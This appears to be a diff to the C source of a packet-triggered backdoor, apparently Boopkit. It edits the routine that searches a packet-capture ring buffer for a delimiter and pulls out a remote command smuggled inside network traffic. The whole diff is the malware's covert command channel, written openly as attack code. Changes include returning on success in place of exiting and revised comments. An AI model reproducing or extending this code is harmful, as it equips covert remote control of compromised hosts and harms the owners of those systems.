@@ -227,14 +227,10 @@ int snapshot(xcap_ip_packet *snap[XCAP_BUFFER_SIZE]) {
 // Different implementations may exist, for the first example
 // we are just using pcap.h
 int xcaprce(char search[INET_ADDRSTRLEN], char *rce) {
-
-  // TODO Hang until the buffer fills up - I think we have a race
-  sleep(1);
-
+  sleep(1); // Wait for the kernel to catch up
   boopprintf("  -> Search xCap Ring Buffer: %s\n", search);
   xcap_ip_packet *snap[XCAP_BUFFER_SIZE];
   snapshot(snap);   // Thread safe snapshot of the ring buffer!
-  boopprintf("Dumping packet snapshot\n");
   for(int i = 0; i < XCAP_BUFFER_SIZE; i++) {
     struct xcap_ip_packet *xpack;
     xpack = snap[i];
@@ -242,22 +238,18 @@ int xcaprce(char search[INET_ADDRSTRLEN], char *rce) {
       continue; // Ignore non captured packets in the buffer
     }
     unsigned char *packet = xpack->packet;
-    // First check if we find our calling card
-
-    // Use memmem() to set RCE directly
+    // DPI for our RCE
     char *rce_sub;
     rce_sub = memmem(packet, xpack->header->len, BOOPKIT_RCE_DELIMITER, strlen(BOOPKIT_RCE_DELIMITER));
     if (rce_sub != NULL) {
       int found;
       found = rce_filter(rce_sub, rce);
       if (found){
-        printf("RCE: %s\n", rce);
-        exit(1);
+        boopprintf("  -> Found RCE xCap: %s\n", rce);
+        return 0; // Money, Success, Fame, Glamour
       }
     }
   }
-  printf("fin\n");
-  exit(1);
   return 1;
   // return 0; // When we found our RCE!
 }
